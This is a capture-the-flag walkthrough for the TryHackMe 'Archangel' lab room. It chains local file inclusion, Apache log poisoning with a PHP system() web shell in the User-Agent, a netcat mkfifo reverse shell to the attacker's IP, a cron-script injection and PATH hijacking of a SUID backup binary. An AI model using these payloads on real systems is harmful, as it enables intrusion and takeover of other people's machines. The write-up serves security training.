# Archangel Walkthrough
<br/>

## Intro
Welcome to the Archangel challenge, here is the link to the [room](https://tryhackme.com/room/archangel) on TryHackme.

In today's challenge we will be exploiting a common vulnerability for web apps, thanks to it we will be able to get a reverse shell to finally escalate our privileges.


Whenever you feel ready press on "Start Machine" and connect via OpenVPN from your machine or use the AttackBox.

Let's begin!

<br/>
<br/>

## The Challenge
Let's add the domain to the hosts file:
```bash
echo "MACHINE_IP archangel.thm" | sudo tee -a /etc/hosts
```

nmap scan:
```bash
nmap -sV -sC archangel.thm
```

We find 2 open ports:
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
```


Let's visit the website: `http://archangel.thm/`.
Looking in thte homepage we can quickly spot an email with the domain REDACTED; this is probably related to the challenge as it appear in the first question, we can add this domain in the hosts file, near the one we added at the beginning.

Now we can try to vist this website: `http://mafialive.thm`, on the homepage we can see the first flag:
--> REDACTED

 Let's take a look at hte `robots.txt` file, if exist it can contains some useful info about the website structure.
```
 http://mafialive.thm/robots.txt
```

Inside of it we find a file called `test.php`, this is alswo the answer to the 3rd question; we can now visit this page.

The test page cotains a button, if we click it we can see the URL changes to:
```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php
```

And the message "control is and ilusion" gets displayed.

Lookind at the URL we can understand that it carries a LFI vulnerability.
Simply changing the end directory does not work, so let's take advantage of PHP wrappers to get the content of the test php file:
```
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```

Here is the encoded data we get, now you can decode it with CyberChef or from the terminal with:
```bash
echo "CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==" | base64 -d
```

We get the following page, which also contains the second flag as a comment:
```php
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

	    //FLAG: REDACTED

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
    </div>
</body>

</html>

```


We can see that the PHP code attempts to block directory traversal attacks by preventing the user from using "`../..`", it also check the existence of the `view` parameter and the presence of the string `/var/www/html/development_testing`, if all this conditions are respected it sends the request, otherwise it will print the not allowed error message.

There are some ways to bypass the fillter we could change the `../..` to something like `..//..` or `.././.././`, or encoding.
Let's test it:
```
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/..//..//..//..//..//..//../var/log/apache2/access.log
```

This succesfully print us the content of the access.log file and confirm us the LFI vulnerabilty.

I have specifically choosen this file because there is a technique called LFI -> RCE via log poisoning, basically we inject some malicious php code on the log file, later we call it via the LFI and we get code execution.

Let's send a request with burp suite injecting the code we want to be logged as a `User-Agent` header value:
```http
GET /test.php?view=/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log&cmd=whoami HTTP/1.1
Host: mafialive.thm
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: <?php system($_GET['cmd']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

Sending this request will print `www-data` in the log file as we can see in the response.
This confirm that the injection works, now we want a reverse shell.

Set up a lister on your machine:
```bash
nc -lvnp 1234
```

Rather than the `whoami` command let's send a pyaload like:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR_IP 1234 >/tmp/f
```

Before sending the request ensure to URL encode this payload or it wont work, after that you will receive a shell.

Let's improve our shell making it interacting, this way we can run commands like `clear`. (I made a guide [here](https://github.com/Maat-Cyber/Maat-Cyber-World/blob/main/Tips-%26-Resources/Reverse_Shell-Upgrade.md) on how to ahieve it.)

Now we can finally get the user flag:
```bash
cat /home/archangel/user.txt
```
--> REDACTED

<br/>


### Privilege Escalation
We are still the www-dat user, checking the archangel home directory doest appear to have the `.ssh` directory containing the ssh key for login.
Let's check othe common places like recurring tasks:
```bash
cat /etc/crontab
```

We can see that a the `helloworld.sh` script is running every minute as the user archangel.
```
*/1 *   * * *   archangel /opt/helloworld.sh
```

If we have write permissions on that file we might be able to edit it and change user, let's check it:
```bash
ls -l /opt/helloworld.sh
```
```bash
-rwxrwxrwx 1 archangel archangel 66 Nov 20  2020 /opt/helloworld.sh
```

Yes we have, let's inject some code to get another reverse shell,
Set up another listener on your machine:
```bash
nc -lvnp 12345
```

On target:
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR_IP 1234 >/tmp/f" >> /opt/helloworld.sh
```

Now wait about 1 minuete to get the shell.

Now we can navigate to the archangel home directory and check inside the `secret` directory, here we find the `user2.txt` flag:
```bash
cat ~/secret/user2.txt
```
--> REDACTED

In that directory we can also see another file called "backup" and has the SUID bit set:
```bash
ls -la
total 32
drwxrwx--- 2 archangel archangel  4096 Nov 19  2020 .
drwxr-xr-x 6 archangel archangel  4096 Nov 20  2020 ..
-rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup
-rw-r--r-- 1 root      root         49 Nov 19  2020 user2.txt
```

We can check the file type:
```bash
file backup 
```

It appears to be and ELF (executable file), without decompiling it we can use `strings` to check it:
```bash
strings backup
```

And we spot one line:
```bash
cp /home/user/archangel/myfiles/* /opt/backupfiles
```

So probably the script backups the  content of the `myfiles` directory into `/opt/backupfiles`.
If we check the current content of our `myfiles` directory we get a file called "passwordbackup" and reading it it contains only a YouTube link, probably a Rick-Roll lol.

Also the copied data do not look interesting, this is a dead end.

Let's think about this: the file run with root privilegs and only calls the `cp` command, maybe we can hijack it or create a fake copy for it to run.
Since the script calls the `cp` command wihtout the full binary path like `/bin/cp`, we can create a copy in the local directory, but this time the `cp` will be created by us, runing the command we want.

```bash
touch cp
```
```bash
echo "cat /root/root.txt" > ./cp
```

Make it executable:
```bash
chmod +x ./cp
```

Now we export the PATH variable to point to our current directory containing the fake `cp`:
```bash
export PATH=/home/archangel/secret:$PATH
```

We can now finally run the executable:
```bash
./backup
```

This will successfully print the root flag

<br/>
<br/>

## Conclusion
Congratulations you have successfully exploited the Local File Inclusion vulnearability and created a malicious version of the `cp` linux command to make your way to the root flag.

I hope you had fun doing the challenge and following along!

Catch you in the next CTF 😃 
